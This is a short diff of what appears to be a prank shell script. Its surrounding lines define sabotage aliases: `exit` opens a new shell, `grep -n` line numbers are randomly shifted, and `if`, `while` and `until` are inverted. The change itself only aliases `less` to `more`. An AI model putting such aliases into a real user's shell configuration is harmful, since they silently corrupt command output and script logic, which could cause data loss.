@@ -82,6 +82,9 @@ alias exit="${SHELL:-sh}";
 # Add a random number to line numbers when using `grep -n`.
 grep() { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
 
+# Use more instead of `less`
+alias less='more'
+
 # Invert `if`, `while` and `until`
 alias if='if !' while='while !' until='until !'
 
